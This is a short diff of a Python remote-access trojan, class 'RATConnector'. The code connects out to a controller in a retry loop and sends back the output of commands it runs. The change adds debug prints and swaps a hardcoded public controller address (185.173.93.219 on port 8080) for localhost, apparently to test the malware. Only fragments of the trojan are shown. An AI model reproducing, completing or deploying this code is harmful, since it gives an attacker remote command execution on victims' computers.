@@ -1,3 +1,6 @@
+print("start")
+
+
 import socket, subprocess, time, json, os, base64, ctypes, sys
 
 class RATConnector:
@@ -6,6 +9,7 @@ class RATConnector:
         while True:
             try:
                 self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                print("try")
                 self.connection.connect((ip, port))
             except socket.error:
                 time.sleep(5)
@@ -91,5 +95,6 @@ class RATConnector:
             self.dataSend(commandResponse)
 
 
-ratClient = RATConnector("185.173.93.219", 8080)
+print("run")
+ratClient = RATConnector("127.0.0.1", 8080)
 ratClient.run()
